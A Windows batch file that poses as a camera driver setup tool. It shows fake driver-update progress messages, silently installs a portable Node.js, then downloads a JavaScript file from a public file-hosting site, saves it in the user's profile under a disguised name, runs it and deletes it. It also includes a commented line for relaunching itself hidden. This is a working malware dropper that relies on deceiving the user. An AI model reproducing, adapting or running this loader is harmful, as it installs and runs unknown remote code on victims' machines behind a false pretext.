@echo off
title Creating new Info
setlocal enabledelayedexpansion

echo [INFO] Searching for Camera Drivers ...
timeout /t 3 /nobreak >nul
echo [INFO] Update Driver Packages...
timeout /t 4 /nobreak >nul
echo [SUCCESS] Camera Driver Setup completed successfully.

:: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

REM Get latest Node.js version using PowerShell
for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"

REM Remove leading "v"
set "NODE_VERSION=%LATEST_VERSION:~1%"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
set "NODE_EXE="

:: -------------------------
:: Check for global Node.js
:: -------------------------
where node >nul 2>&1
if not errorlevel 1 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
    set "NODE_EXE=node"
)

if not defined NODE_EXE (
    if exist "%PORTABLE_NODE%" (
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else (

    :: -------------------------
    :: Download Node.js MSI if needed
    :: -------------------------
    where curl >nul 2>&1
    if errorlevel 1 (
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'" >nul 2>&1
    ) else (
        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%" >nul 2>&1
    )

    if exist "%~dp0%NODE_MSI%" (
        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
        del "%~dp0%NODE_MSI%"
    ) else (
        exit /b 1
    )

    if exist "%PORTABLE_NODE%" (
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else (
        exit /b 1
    )
    )
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
if not defined NODE_EXE (
    exit /b 1
)

:: -------------------------
:: Download required files
:: -------------------------
set "CODEPROFILE=%USERPROFILE%"
if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"

where curl >nul 2>&1
if errorlevel 1 (
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
) else (
    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js" >nul 2>&1
)

:: -------------------------
:: Run the parser
:: -------------------------
if exist "%CODEPROFILE%\env-setup.npl" (
    cd /d "%CODEPROFILE%"
    "%NODE_EXE%" "env-setup.npl"

    if errorlevel 1 (
        exit /b 1
    )

    if exist "%CODEPROFILE%\env-setup.npl" (
        del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
    )
) else (
    exit /b 1
)
